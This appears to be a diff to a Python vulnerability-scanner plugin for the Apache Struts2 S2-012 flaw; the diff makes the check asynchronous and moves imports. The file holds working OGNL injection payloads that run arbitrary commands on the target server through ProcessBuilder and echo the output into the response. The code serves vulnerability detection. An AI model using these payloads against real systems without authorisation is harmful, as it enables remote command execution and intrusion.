@@ -1,8 +1,8 @@
 
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, filter_str, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, filter_str, get_useragent
 
 class S2_012_BaseVerify:
     def __init__(self, url):
@@ -25,7 +25,7 @@ class S2_012_BaseVerify:
         self.check_payload =  '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + '"echo",' + '\"' + self.capta + '\"' + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
         self.payload =  '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{S2_012})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'                                
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -37,16 +37,13 @@ class S2_012_BaseVerify:
 
         try:
             self.check_data = {'name': self.payload.replace('S2_012', '"echo",' + '\"' + self.capta + '\"')}
-            check_res = request.post(self.url, data = self.check_data, headers = self.headers)
-            check_str = filter_str(list(check_res.text))
-            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
+            check_res = await request.post(self.url, data = self.check_data, headers = self.headers)
+            check_str = filter_str(list(await check_res.text()))
+            if check_res.status == 200 and len(check_str) < 100 and self.capta in check_str:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
